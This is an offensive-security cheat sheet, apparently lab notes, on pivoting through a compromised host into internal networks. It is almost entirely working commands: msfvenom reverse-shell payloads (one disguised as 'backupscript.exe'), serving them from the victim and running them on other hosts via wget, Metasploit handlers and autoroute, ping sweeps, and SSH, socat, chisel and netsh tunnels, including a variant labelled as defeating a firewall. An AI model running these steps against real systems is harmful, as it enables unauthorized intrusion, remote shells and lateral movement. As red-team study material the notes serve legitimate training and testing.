# Pivoting

## SSH

### Port forwarding

```bash
kali@attacker$ ssh root@victim -L 127.0.0.1:4444:other_host:5432 -N
kali@attacker$ ssh root@victim -R victim:4444:attacker:5555 -N
root@victim$ ssh kali@attacker -R 127.0.0.1:4444:other_host:5432 -N
```

### Proxy SOCKS

```bash
$ ssh -D 9050 root@victime
$ tail /etc/proxychains.conf
...
[ProxyList]
socks4 	127.0.0.1 9050
$ sudo proxychains nmap -sT -F other_host
```

To be noted:
 - Only TCP Connect Scan is supported by proxychains (default with nmap)
 - sudo is mandatory (RAW socket by proxychains)

## Proxy SOCKS with MSF

### On attacker

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=other_host -f elf -o reverse.bin LPORT=4444
$ scp reverse.bin root@victim:/tmp
$ ssh -D 9050 -R victim_other_ip:4444:0.0.0.0:8000 root@victim
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### On victim

```bash
$ cp /tmp
$ python -m http.server 8765
```

### On other_host

```bash
$ wget http://victim_other_ip:8765/reverse.bin
$ chmod +x reverse.bin
$ ./reverse.bin
```

### Pivoting from Victim

#### Scanning network 

 * From bash: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
 * From MSF: `msf6 exploit(multi/handler) >  run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24`

#### Nmap scan:

##### Open SOCKS Proxy

From MSF (outside session)
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > jobs
```

##### Routing to our VM

To tell our socks_proxy module to route all the traffic via our Meterpreter session, we can use the post/multi/manage/autoroute module.
Then, we route all traffic through proxychains.

Before autoroute on **Victim**:

```bash
$ route -n

```

From MSF (outside meterpreter session)
```
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> use post/multi/manage/autoroute
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> set SUBNET 172.16.5.0
[msf](Jobs:1 Agents:1) post(multi/manage/autoroute) >> run
```

After autoroute on **Victim**:
```bash
$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.129.0.1      0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
172.16.4.0      0.0.0.0         255.255.254.0   U     0      0        0 ens224
```

##### Nmap scan with proxychains

```bash
$ tail /etc/proxychains4.conf 
[ProxyList]
socks4 	127.0.0.1 9050
$ sudo proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

#### Ports forwarding

##### Local => Victim => Other Host

Useful to interact with a local post and use local tools.

 * Listen to the port 3300 on **Attacker**
 * Forward all packets to **victim:8080**

From MSF (inside meterpreter session)
```
(Meterpreter 1)(/home/ubuntu) > portfwd add -l 3300 -p 8080 -r victim
```

Interact with service
```bash
$ curl http://localhost:8080/
```

##### Other Host => Victim => Local

Useful to get reverse shell to connect to local meterpreter

From MSF (inside meterpreter session)
```
(Meterpreter 1)(/home/ubuntu) > portfwd add -R -l 8081 -p 1234 -L Attacker
```

A server is started on **victim**:
```
$ netstat -antop | grep 1234
tcp6       0      0 :::1234                 :::*                    LISTEN      1784/backupjob       off (0.00/0/0)
```

On **Attacker**, craft reverse meterpreter which connect to **victim**, upload and execute it onn **other_host**
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=victim -f exe -o backupscript.exe LPORT=1234
````

On **Attacker** :
```bash
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8081
msf6 exploit(multi/handler) > run
```

## Port forwarding with SOCAT

### Local => Victim => Other Host

On **victim**:
```bash
$ socat TCP4-LISTEN:8080,fork TCP4:other_host:8443
$ netstat -antop | grep socat
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      4207/socat           off (0.00/0/0)
```

###  Other Host => Victim => Local

Reverse tunneling from other_host to attacker through victim

On **victim**:
```bash
$ socat TCP4-LISTEN:1234,fork TCP4:attacker:8081
$ netstat -antop | grep socat
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      4207/socat           off (0.00/0/0)
```

## Other tools

 - plink : `plink -ssh -D 9050 ubuntu@10.129.15.50`
 - sshuttle: `sudo sshuttle -r root@victim "subnet other host"/23 -v`
 - rpivot
 - DNS Tunneling: dnscat2
 - ICMP Tunneling: ptunnel-ng

### chisel

On **attacker**
```
$ chisel server -v --socks5 --reverse --port 5036
$ tail /etc/proxychains4.conf                        
[ProxyList]
socks5  127.0.0.1 5136
```

On **Victim**:
```bash
$ chisel client 172.22.0.36:5036 R:5136:socks
```

After connection from chisel **Victim**, on **attacker**:
```bash
$ sudo netstat -antop | grep chisel
tcp        0      0 127.0.0.1:5136          0.0.0.0:*               LISTEN      1449854/./chisel_1.  off (0.00/0/0)
```

**Port forwarding avec Chisel**:

On **attacker**: `$ chisel server -v --reverse --port 5036`
 
 - Local => Victim => Other Host : `./chisel client attacker:5036 :8003:Other_Host:8004`, server run on 8004 on **other host**, `curl victim:8003` on attacker
 - Local <= Victim => Other Host (defeat firewall) :  `./chisel client attacker:5036 R:8003:victim:8004`, other host connect on 8004, `curl 127.0.0.1:8003`on attacker
 - Other Host => Victim => Local : `./chisel client attacker:5036 :8003:victim:8004`, other host connect on 8004, `nc -lvnp 8003`on attacker

### netsh

On Windows **Victim**:
```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
